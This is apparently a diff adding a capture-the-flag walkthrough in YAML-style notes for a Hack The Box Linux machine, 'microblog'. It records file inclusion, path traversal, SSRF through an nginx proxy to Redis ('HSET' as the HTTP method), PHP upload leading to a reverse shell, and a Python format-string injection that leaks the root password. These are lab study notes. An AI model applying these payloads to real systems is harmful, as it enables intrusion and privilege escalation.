@@ -1,0 +1,156 @@
+Format:
+  Difficulty: Medium
+  OS: Linux
+  Listening ports: 22,80,3000
+
+  Website (http://app.microblog.htb:80):
+    Redirects to "app.microblog.htb"
+    Subdomain enumeration:
+      - "admin.microblog.htb"
+      - "test.microblog.htb"
+      - "sunny.microblog.htb"
+    Technologies:
+      Server: "nginx/1.18.0"
+      Language: php
+
+    Endpoints:
+      /index.php:
+        footer:
+          "Loving Microblog? Contribute here!": Redirects to "http://microblog.htb:3000/cooper/microblog"
+      /login:
+        Vulns:
+          SQL Injection: None
+          XSS in error message: None
+      /register:
+        Vulns:
+          SQL Injection: TODO
+      /dashboard:
+        footer:
+          "Wanna go pro and upload images for only $5 a month? >": Might be a file upload somewhere
+        Creating a new blog:
+          "app.microblog.htb": "Sorry, that site has already been taken"
+          "*.microblog.htb": "Invalid blog name"
+          "foo.microblog.htb": "Site added successfully!"
+
+  Website (http://foo.microblog.htb:80):
+    Add h1/paragraph title:
+      Vulns:
+        XSS: Yes
+        SQL Injection: None
+
+  Website (http://microblog.htb:3000):
+    Gitea 1.17.3 (Oct 2022)
+    Users:
+      cooper
+    Public repositories:
+      cooper/microblog:
+        Branches: Only "main"
+        Source:
+          Uses Redis:
+            "$redis->connect('/var/run/redis/redis.sock');":
+              Redis is using a unix socket
+          Webroot: "/var/www/microblog/"
+          "system('cp -r /var/www/microblog-template/* /var/www/microblog/' . $site_name);":
+            Command injection on site_name in dashboard/index.php: Protected by regex "^[a-z]+$"
+          Adding text:
+            1. Send $id and $text:
+              $id: The filename
+              $text: The file's content (in the middle of html content)
+            2. $text get written to $id file in "content/" directory
+            3. $id gets written to "order.txt"
+            4. All the content of the filenames in "order.txt" gets added to the page
+
+            Vulnerabilities:
+              Local File Inclusion:
+                id: "/etc/passwd":
+                  /etc/passwd's content gets added to page:
+                    Write exploit: readFile.py
+              Path traversal in id:
+                PHP File upload:
+                  id: "../foo.php": Not accessible
+                  id: "../edit/foo.php": Not accessible
+                  id: "../content/foo.php": Send the file to the user without executing it
+                  id: "../index.php": Doesn't override the index file
+                  id: "/var/www/foo/foo.php": Not accessible
+                  id: "../edit/bulletproof.php": Not getting included
+                  id: "/var/www/foo/edit/bulletproof.php": Not getting included
+                  Might not have permission to write outside of "content" directory:
+                    Pro users gets a writable "uploads" directory
+              SSRF with id:
+                id: "http://10.10.xx.xx:1234/poc":
+                  Received request
+                id: "unix:/var/run/redis/redis.sock":
+                  Does not seems to work:
+                    TODO: Keep digging if no other path is found
+
+  Local files:
+    /etc/passwd:
+      "cooper:1000:/home/cooper"
+    /etc/hosts:
+      "127.0.0.1 localhost microbucket.htb"
+    /home/cooper/.ssh/id_rsa: None
+    /proc/self/environ: None
+    /etc/nginx/nginx.conf: Nothing
+      server_name: microblog.htb
+      location ~ /static/(.*)/(.*): 
+        proxy_pass: "http://$1.microbucket.htb/$2":
+          "http://microblog.htb/static/10.10.xx.xx%3a1234%23/foo":
+            Final url: "http://10.10.xx.xx:1234/#.microbucket.htb/foo"
+            Received GET request: /#.microbucket.htb/foo
+          proxy_pass can forward to a unix socket (e.g. http://unix:/tmp/backend.socket:/uri/):
+            "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%Fredis.sock:%23/foo":
+              Final url: "http://unix:/var/run/redis/redis.sock:#.microblog.htb/foo":
+                What redis should receive: "GET #microblog.htb/foo HTTP/1.1"
+                Sending with "HSET foo pro true" as HTTP method:
+                  400 Bad Request:
+                    Nginx return a "bad request" if the HTTP method has more than one word
+            "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:foo%20pro%20true%20/foo":
+              Final url: "http://unix:/var/run/redis/redis.sock:foo pro true microblog.htb/foo":
+                What redis should receive: "GET foo pro true microblog.htb/foo HTTP/1.1"
+              Sending with "HSET" as HTTP method:
+                What redis should receive:
+                  "HSET foo pro true microblog.htb/foo HTTP/1.1":
+                    MAKES "foo" A PRO USER
+
+  Website (As pro user) (http://foo.microblog.htb):
+    Add text to page:
+      id: ../uploads/foo.php
+      text: "<?php phpinfo(); ?>"
+    Go to http://foo.microblog.htb/uploads/foo.php:
+      PHPINFO GETS EXECUTED
+      Write exploit: getReverseShell.py
+
+  Shell as www-data:
+    id: Only user group
+    ~/.git:
+      config: "url = http://localhost:3000/cooper/microblog.git"
+    env: Nothing
+    Listening ports: 22,80,3000,9000
+    Procs:
+      "git /usr/local/bin/gitea web --config /etc/gitea/app.ini"
+      "redis /usr/bin/redis-server 127.0.0.1:0"
+    /etc/gitea/app.ini: Permission denied
+    redis-cli:
+      KEYS:
+        - "cooper.dooper":
+          "username": "cooper.dooper"
+          "password": "zooperdoopercooper":
+            VALID SSH CREDS FOR USER cooper
+        - "cooper.dooper:sites"
+
+  Shell as cooper:
+    id: Only user group
+    sudo -l:
+      "(root) /usr/bin/license":
+        "Microblog license key manager": Python script
+        "-p username": Provision license key for specified user
+        "-d username": Deprovision license key for specified user
+        "-c license_key": Check if specified license key is valid
+        salt: microblogsalt123
+        "license_key = (prefix + username + '{license.license}' + firstlast).format(license=l)":
+          Format with user supplied input:
+            firstname: "{license.__init__.__globals__}":
+              Plaintext license key:
+                "microblogfooS]R/?qDbEM90c7m/c*l=Sa+hn+xn-('0i\ije@N~foo{'__name__': ...":
+                  'secret': 'unCR4ckaBL3Pa$$w0rd':
+                    VALID ROOT PASSWORD
